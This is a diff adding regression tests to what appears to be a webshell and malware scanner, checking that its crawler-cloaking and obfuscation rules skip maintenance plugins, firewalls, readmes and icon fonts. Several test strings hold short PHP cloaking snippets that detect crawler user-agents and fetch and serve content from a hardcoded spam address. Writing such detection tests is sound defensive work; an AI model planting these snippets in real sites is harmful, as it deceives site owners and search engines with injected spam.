@@ -1511,3 +1511,75 @@ TEST(RepairedRuleTest, UserAgentCloakingNeedsCrawlersAndAFetchAndAnEmitter) {
         R"(if (preg_match('/'.str_replace(',','|',$bots).'/i',$ua)) {)"
         R"($c=curl_exec(curl_init('https://spam.example/x.txt')); echo $c; exit; })"));
 }
+
+// ============================================================================
+// Regressions found by rescanning the whole production tree
+//
+// The 266-file sample corpus reproduced every rule that reported, but it could not
+// contain a file no rule had reported *before*. These two false positives were
+// introduced by the new rules and only appeared on a full 1.3 M-file rescan.
+// ============================================================================
+
+// SEO008: knowing what a crawler is, and fetching something, are both ordinary.
+// The technique is fetching *a hardcoded address* and serving it to crawlers, so the
+// address and the fetch are written together.
+TEST(RescanRegressionTest, CloakingNeedsTheFetchTargetNextToTheFetch) {
+    // A maintenance-mode plugin: names crawlers so it can let them through, and
+    // contains URLs elsewhere in 290 KB of unrelated code.
+    std::string maintenance =
+        "<?php\n$crawlers = 'Googlebot,bingbot,YandexBot,Baiduspider,Slurp';\n"
+        "if (preg_match($re, $_SERVER['HTTP_USER_AGENT'] ?? '')) { return true; }\n";
+    maintenance += std::string(4000, ' ') + "\n";
+    maintenance += "$logo = file_get_contents($this->plugin_dir . '/img/logo.png');\n";
+    maintenance += std::string(4000, ' ') + "\n";
+    maintenance += "$docs = 'https://example.com/documentation';\necho $html;\n";
+    EXPECT_FALSE(ruleFires("SEO008", maintenance));
+
+    // A security plugin's firewall: crawler names and a curl call, but no URL literal
+    // for it to fetch at all.
+    std::string firewall =
+        "<?php\nif (preg_match('/googlebot|bingbot|YandexBot|Baiduspider/i', "
+        "$_SERVER['HTTP_USER_AGENT'])) { $this->block(); }\n";
+    firewall += std::string(2000, ' ') + "\n$r = curl_exec($ch);\necho $r;\n";
+    EXPECT_FALSE(ruleFires("SEO008", firewall));
+
+    // The cloaker: the address it serves sits right next to the call that fetches it.
+    EXPECT_TRUE(ruleFires("SEO008",
+        "<?php\n$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';\n"
+        "if (preg_match('/googlebot|bingbot|yandexbot|ahrefsbot/i', $ua)) {\n"
+        "  $u = 'https://storage.example.com/cdn/spam.html';\n"
+        "  $ch = curl_init($u); $r = curl_exec($ch); echo $r; exit;\n}\n"));
+}
+
+// SEO008's file-type gate: a readme that documents crawler user-agents is not code.
+TEST(RescanRegressionTest, CloakingOnlyReportsExecutableFiles) {
+    auto gated = [](std::string_view path) {
+        MatchContext ctx;
+        ctx.content = "irrelevant";
+        ctx.filePath = path;
+        ctx.matchOffset = 0;
+        ctx.matchLine = 1;
+        ctx.matchColumn = 1;
+        ctx.matchedText = "irrelevant";
+        return MatchEngine::applyContextFilter("SEO008", ctx);
+    };
+    EXPECT_FALSE(gated("/var/www/plugins/wp-fastest-cache/readme.txt"));
+    EXPECT_FALSE(gated("/var/www/plugins/x/CHANGELOG.md"));
+    EXPECT_TRUE(gated("/var/www/index.php"));
+    EXPECT_TRUE(gated("/var/www/wp-content/themes/x/functions.inc"));
+    // A webshell routinely has no extension - one cloaker found this way was a bare
+    // filename in a file manager plugin's .tmp directory.
+    EXPECT_TRUE(gated("/var/www/plugins/filester/lib/files/.tmp/ELFRcMlAg"));
+}
+
+// OBF038: an icon font documents every glyph it defines as a quoted escape sequence,
+// which is short and has the high character diversity that a hex string always has.
+TEST(RescanRegressionTest, NoiseCommentsAreNotIconFontGlyphReferences) {
+    std::string entypo = "@charset \"UTF-8\";\n";
+    const char* glyphs[] = {"1f3b5", "1f50d", "1f526", "2709", "2605", "1f464", "1f465"};
+    for (int i = 0; i < 40; ++i) {
+        entypo += ".icon-" + std::to_string(i) + ":before { content: '\\" +
+                  glyphs[i % 7] + "'; } /* '\\" + glyphs[i % 7] + "' */\n";
+    }
+    EXPECT_FALSE(ruleFires("OBF038", entypo));
+}
